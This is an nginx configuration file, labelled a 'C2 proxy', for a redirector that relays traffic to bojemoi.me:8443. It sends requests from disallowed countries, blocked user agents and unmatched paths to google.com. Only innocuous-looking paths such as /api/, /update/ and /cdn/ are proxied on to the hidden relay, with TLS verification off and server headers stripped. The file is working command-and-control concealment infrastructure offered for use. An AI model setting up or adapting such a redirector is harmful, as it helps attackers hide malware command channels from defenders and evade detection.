# C2 proxy — relay to bojemoi.me:8443
# RELAY_HOST and RELAY_PORT are substituted at container start via entrypoint
# or baked in at build time via ARG (default: bojemoi.me:8443)

server {
    listen 443 ssl http2;
    server_name _;

    ssl_certificate     /etc/nginx/ssl/self-signed.crt;
    ssl_certificate_key /etc/nginx/ssl/self-signed.key;
    ssl_protocols       TLSv1.2 TLSv1.3;
    ssl_ciphers         HIGH:!aNULL:!MD5;

    if ($allowed_country = 0) { return 302 https://www.google.com/; }
    if ($blocked_ua = 1)      { return 302 https://www.google.com/; }

    location ~ "^/(api|update|assets|cdn|content|upload|download|sync|data|v[0-9]+)/" {
        proxy_pass          https://RELAY_HOST:RELAY_PORT;
        proxy_ssl_verify    off;
        proxy_http_version  1.1;
        proxy_connect_timeout 5s;
        proxy_read_timeout    300s;
        proxy_send_timeout    300s;
        proxy_buffering       off;
        proxy_set_header X-Real-IP       $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header Host            $host;
        proxy_hide_header X-Powered-By;
        proxy_hide_header Server;
    }

    location / { return 302 https://www.google.com/; }
}

server {
    listen 80;
    server_name _;
    return 301 https://$host$request_uri;
}
